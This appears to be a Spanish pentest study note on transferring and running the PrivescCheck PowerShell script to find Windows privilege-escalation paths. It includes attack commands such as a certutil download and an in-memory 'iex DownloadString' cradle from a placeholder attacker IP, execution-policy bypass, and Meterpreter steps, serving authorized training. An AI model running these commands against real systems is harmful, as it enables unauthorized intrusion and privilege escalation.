# 🕵️ PrivescCheck: Escalada de Privilegios en Windows
**PrivescCheck** es un script de PowerShell diseñado para enumerar rápidamente vulnerabilidades comunes y errores de configuración en sistemas Windows.

- **Proyecto Original:** [PrivescCheck-GitHub](https://github.com/itm4n/PrivescCheck)
- **Objetivo:** Identificar vectores de escalada de privilegios (PrivEsc) y recolectar información de post-explotación.

## 📥 1. Cómo obtenerlo y transferirlo
Para usarlo en la víctima, primero debemos en el propio sistema víctima o descargarlo en nuestra máquina de ataque (Kali) y luego pasarlo al objetivo.
### Paso A: Descarga en Kali
- Clonar Repo`git clone https://github.com/itm4n/PrivescCheck`
- Descarga rápida solo del script: `wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1`
- En el README existe un enlace para descargar solo el script rápidamente.
### Paso B: Transferencia a la víctima
Una vez en la máquina víctima (vía Shell o Meterpreter), puedes usar cualquiera de estos métodos:

1. **Desde Meterpreter:** `upload /ruta/en/kali/PrivescCheck.ps1 C:\\Temp\\PrivescCheck.ps1`
2. `certutil -urlcache -f http://<TU_IP_KALI>/PrivescCheck.ps1 ruta\destino\PrivescCheck.ps1`
3. **Desde PowerShell (Descarga directa a memoria):** `iex (New-Object Net.WebClient).DownloadString('http://<TU_IP_KALI>/PrivescCheck.ps1')`

> [!tip] El paso 3 lo descargar y ejecuta el script sin guardarlo en disco

## 🚀 2. Uso de la herramienta
Para que funcione, primero debemos cargar el script en la sesión de PowerShell y luego ejecutar la función principal.
### Método Rápido (Pentest estándar)
Si ya tienes el archivo en la máquina víctima, ejecuta este comando desde el CMD:
- `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
	- `-ep bypass`: Salta la política de ejecución de scripts de Windows.
	- `Invoke-PrivescCheck`: Es la función que inicia el escaneo.

### Método Extendido (Reporte para análisis)
Si quieres que analice más a fondo y guarde los resultados en un archivo para leerlo con calma:
- `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report reporte_ejpt -Format TXT,HTML"`
- (Esto generará un archivo `.html` que puedes abrir en un navegador para ver tablas ordenadas y filtrables.)

## 📊 3. ¿Qué datos valiosos buscamos?
Al terminar, el script marcará en colores o secciones los hallazgos. Debes prestar especial atención a:

- **Unquoted Service Paths:** Rutas de servicios con espacios y sin comillas.
- **Modifiable Service Binaries:** Servicios donde tu usuario tiene permiso para cambiar el ejecutable (Permisos de Escritura). 
- **AlwaysInstallElevated:** Si esta clave del registro es `1`, puedes instalar un `.msi` malicioso y ser SYSTEM.
- **Credentials in Registry/Files:** Contraseñas guardadas en texto plano en el registro o archivos `unattend.xml`.
- **Vulnerable Drivers:** Controladores antiguos con exploits públicos conocidos.

## ⚠️ 4. Problemas comunes (Troubleshooting)

### Error de Timeout en Metasploit
Si ejecutas el script desde una shell de Meterpreter, es probable que se corte porque tarda más de 15 segundos. **Solución:**

```
# Antes de entrar a la sesión, sube el tiempo de espera a 2 minutos (120 seg)
msf> sessions -t 120 -i <ID_SESION>
meterpreter> load powershell
meterpreter> powershell_execute "Invoke-PrivescCheck"
```

### El script se detiene si ya eres Admin
PrivescCheck está hecho para subir de usuario normal a Admin. Si ya eres Admin, el script saltará muchos chequeos. Si aun así quieres correrlo para post-explotación, usa el flag `-Force`.

---
**Navegación:**
- Anterior: [[Herramientas Post-Explotación Windows]]
- [[Herramientas]]